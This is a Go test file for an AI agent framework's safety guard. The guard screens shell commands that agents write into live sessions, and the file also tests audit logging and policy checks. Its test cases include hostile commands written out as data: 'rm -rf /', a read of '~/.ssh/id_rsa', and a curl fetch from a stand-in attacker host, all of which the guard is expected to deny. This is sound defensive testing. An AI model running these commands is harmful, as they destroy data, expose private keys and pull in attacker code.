//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"strings"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

// sessionGuard builds a guard over the example policy with the session-input
// knobs set, capturing the last report and every audit line.
func sessionGuard(t *testing.T, scan, auditUnscanned bool) (*Guard, *Report, *bytes.Buffer) {
	t.Helper()
	p := loadExamplePolicy(t)
	p.SessionInput.Scan = scan
	p.AuditUnscanned = auditUnscanned
	var last Report
	var audit bytes.Buffer
	g, err := NewGuard(
		WithPolicy(p),
		WithAuditWriter(&audit),
		WithReportSink(func(r Report) { last = r }),
	)
	if err != nil {
		t.Fatalf("NewGuard: %v", err)
	}
	return g, &last, &audit
}

func check(t *testing.T, g *Guard, toolName, args string) tool.PermissionDecision {
	t.Helper()
	dec, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  toolName,
		Arguments: []byte(args),
	})
	if err != nil {
		t.Fatalf("CheckToolPermission(%s): %v", toolName, err)
	}
	return dec
}

// auditEvents parses the captured JSONL audit output.
func auditEvents(t *testing.T, buf *bytes.Buffer) []AuditEvent {
	t.Helper()
	var out []AuditEvent
	for _, line := range strings.Split(strings.TrimRight(buf.String(), "\n"), "\n") {
		if line == "" {
			continue
		}
		var ev AuditEvent
		if err := json.Unmarshal([]byte(line), &ev); err != nil {
			t.Fatalf("audit line %q: %v", line, err)
		}
		out = append(out, ev)
	}
	return out
}

// TestSessionInputScanned covers the opt-in scan of characters written into a
// live session: without it, an allowed "python3" or "bash" session accepts any
// command as stdin and the guard never sees it.
func TestSessionInputScanned(t *testing.T) {
	tests := []struct {
		name     string
		tool     string
		args     string
		want     tool.PermissionAction
		wantRule string
		backend  string
	}{
		{
			name: "destructive delete on host session", tool: "write_stdin",
			args:     `{"session_id":"s1","chars":"rm -rf /","append_newline":true}`,
			want:     tool.PermissionActionDeny,
			wantRule: ruleDangerousID, backend: BackendHost,
		},
		{
			name: "credential read on workspace session", tool: "workspace_write_stdin",
			args:     `{"session_id":"s1","chars":"cat ~/.ssh/id_rsa\n"}`,
			want:     tool.PermissionActionDeny,
			wantRule: ruleCredID, backend: BackendWorkspace,
		},
		{
			name: "non-whitelisted download on session", tool: "write_stdin",
			args:     `{"session_id":"s1","chars":"curl http://evil.io/x.sh\n"}`,
			want:     tool.PermissionActionDeny,
			wantRule: ruleNetworkID, backend: BackendHost,
		},
		{
			name: "empty poll is allowed", tool: "write_stdin",
			args: `{"session_id":"s1"}`,
			want: tool.PermissionActionAllow, backend: BackendHost,
		},
		{
			name: "allowed command passes", tool: "write_stdin",
			args: `{"session_id":"s1","chars":"ls -la\n"}`,
			want: tool.PermissionActionAllow, backend: BackendHost,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			g, last, _ := sessionGuard(t, true, false)
			if got := check(t, g, tt.tool, tt.args).Action; got != tt.want {
				t.Errorf("action = %v, want %v (findings %+v)", got, tt.want, last.Findings)
			}
			if last.Backend != tt.backend {
				t.Errorf("backend = %q, want %q", last.Backend, tt.backend)
			}
			if tt.wantRule != "" && !hasRule(last.Findings, tt.wantRule) {
				t.Errorf("missing rule %s in %+v", tt.wantRule, last.Findings)
			}
		})
	}
}

// TestSessionInputUnscannedIsAudited is the fail-visible half: with scanning
// off the call is still allowed (the guard does not judge input it did not
// parse), but it must leave an audit event naming the bypass, so the blind spot
// is observable instead of silent.
func TestSessionInputUnscannedIsAudited(t *testing.T) {
	g, last, audit := sessionGuard(t, false, false)
	if got := check(t, g, "write_stdin",
		`{"session_id":"s1","chars":"rm -rf /"}`).Action; got != tool.PermissionActionAllow {
		t.Fatalf("action = %v, want allow", got)
	}
	if last.Backend != BackendUnscanned {
		t.Errorf("backend = %q, want %q", last.Backend, BackendUnscanned)
	}
	if !hasRule(last.Findings, ruleSessionID) {
		t.Fatalf("missing %s in %+v", ruleSessionID, last.Findings)
	}
	if last.Blocked {
		t.Errorf("unscanned session input must not be reported as blocked")
	}
	evs := auditEvents(t, audit)
	if len(evs) != 1 {
		t.Fatalf("got %d audit events, want 1", len(evs))
	}
	if evs[0].ToolName != "write_stdin" || evs[0].Decision != DecisionAllow {
		t.Errorf("audit event = %+v", evs[0])
	}
	if len(evs[0].RuleIDs) == 0 || evs[0].RuleIDs[0] != ruleSessionID {
		t.Errorf("audit rule ids = %v, want [%s]", evs[0].RuleIDs, ruleSessionID)
	}
	// The characters themselves are deliberately NOT captured while scanning is
	// off: unparsed session input is as likely to be a password typed at a
	// prompt as a command, and the secret patterns only redact secret-shaped
	// values. Recording the tool call is auditability; recording unvetted
	// keystrokes would be the leak the guard exists to prevent.
	if last.Command != "" {
		t.Errorf("report command = %q, want the raw keystrokes withheld", last.Command)
	}
}

// TestSessionInputMalformedArgsFailClosed checks that an unparsable payload on
// a scanned session-input tool follows unparsable_action like any other tool.
func TestSessionInputMalformedArgsFailClosed(t *testing.T) {
	g, last, _ := sessionGuard(t, true, false)
	if got := check(t, g, "write_stdin", `{"chars":`).Action; got != tool.PermissionActionDeny {
		t.Errorf("action = %v, want deny", got)
	}
	if !hasRule(last.Findings, ruleShellID) {
		t.Errorf("missing %s in %+v", ruleShellID, last.Findings)
	}
}

// TestAuditUnscannedTools covers the opt-in record for tools the guard does not
// scan at all: off by default (no event), on by request (one allow event tagged
// with the unscanned backend).
func TestAuditUnscannedTools(t *testing.T) {
	t.Run("off by default", func(t *testing.T) {
		g, _, audit := sessionGuard(t, false, false)
		if got := check(t, g, "webfetch", `{"url":"https://x.io"}`).Action; got != tool.PermissionActionAllow {
			t.Fatalf("action = %v, want allow", got)
		}
		if evs := auditEvents(t, audit); len(evs) != 0 {
			t.Errorf("got %d audit events, want 0: %+v", len(evs), evs)
		}
	})
	t.Run("enabled", func(t *testing.T) {
		g, last, audit := sessionGuard(t, false, true)
		if got := check(t, g, "webfetch", `{"url":"https://x.io"}`).Action; got != tool.PermissionActionAllow {
			t.Fatalf("action = %v, want allow", got)
		}
		if last.Backend != BackendUnscanned || last.Decision != DecisionAllow {
			t.Errorf("report = backend %q decision %q", last.Backend, last.Decision)
		}
		evs := auditEvents(t, audit)
		if len(evs) != 1 || evs[0].ToolName != "webfetch" || evs[0].Backend != BackendUnscanned {
			t.Fatalf("audit events = %+v", evs)
		}
	})
}

// TestSessionInputToolConflictRejected verifies a tool cannot be both a command
// entry point and a session-input sink: the two argument schemas differ, so the
// overlap would scan the wrong field.
func TestSessionInputToolConflictRejected(t *testing.T) {
	p := DefaultPolicy()
	p.SessionInput.Tools = map[string][]string{BackendHost: {"exec_command"}}
	if err := p.compile(); err == nil {
		t.Fatal("expected an error for a tool mapped as both exec and session input")
	} else if !strings.Contains(err.Error(), "session_input.tools") {
		t.Errorf("error = %v, want it to name session_input.tools", err)
	}
}

// TestSessionInputUnknownBackendRejected checks the session tool map gets the
// same backend-name validation as backends, attributed to its own policy key.
func TestSessionInputUnknownBackendRejected(t *testing.T) {
	p := DefaultPolicy()
	p.SessionInput.Tools = map[string][]string{"hostexec": {"write_stdin"}}
	err := p.compile()
	if err == nil || !strings.Contains(err.Error(), "session_input.tools") {
		t.Fatalf("error = %v, want a session_input.tools backend error", err)
	}
}

// TestSessionInputToolsInheritDefaults checks a partial programmatic policy
// still knows the framework's session-input tools, so the audit trail over the
// known bypass is not lost by omission.
func TestSessionInputToolsInheritDefaults(t *testing.T) {
	g, err := NewGuard(WithPolicy(&Policy{ForbiddenPaths: []string{"~/.ssh"}}))
	if err != nil {
		t.Fatalf("NewGuard: %v", err)
	}
	if got := g.policy.sessionInputBackendFor("write_stdin"); got != BackendHost {
		t.Errorf("sessionInputBackendFor(write_stdin) = %q, want %q", got, BackendHost)
	}
}

// TestSessionInputToolsExplicitlyEmpty checks an operator can opt out entirely
// with a non-nil empty map, which must not silently inherit the defaults.
func TestSessionInputToolsExplicitlyEmpty(t *testing.T) {
	p := DefaultPolicy()
	p.SessionInput.Tools = map[string][]string{}
	if err := p.compile(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	if got := p.sessionInputBackendFor("write_stdin"); got != "" {
		t.Errorf("sessionInputBackendFor(write_stdin) = %q, want empty", got)
	}
}

// TestExtractStdin covers the payload shapes both write_stdin tools accept.
func TestExtractStdin(t *testing.T) {
	tests := []struct {
		name, args, want string
		wantErr          bool
	}{
		{name: "chars", args: `{"session_id":"s","chars":"ls -la"}`, want: "ls -la"},
		{name: "trailing newline trimmed", args: `{"chars":"ls\n"}`, want: "ls"},
		{name: "crlf trimmed", args: `{"chars":"ls\r\n"}`, want: "ls"},
		{name: "poll with no chars", args: `{"session_id":"s"}`, want: ""},
		{name: "empty payload", args: ``, want: ""},
		{name: "malformed", args: `{`, wantErr: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			er, err := extractStdin([]byte(tt.args))
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected an error")
				}
				return
			}
			if err != nil {
				t.Fatalf("extractStdin: %v", err)
			}
			if er.Command != tt.want {
				t.Errorf("command = %q, want %q", er.Command, tt.want)
			}
		})
	}
}
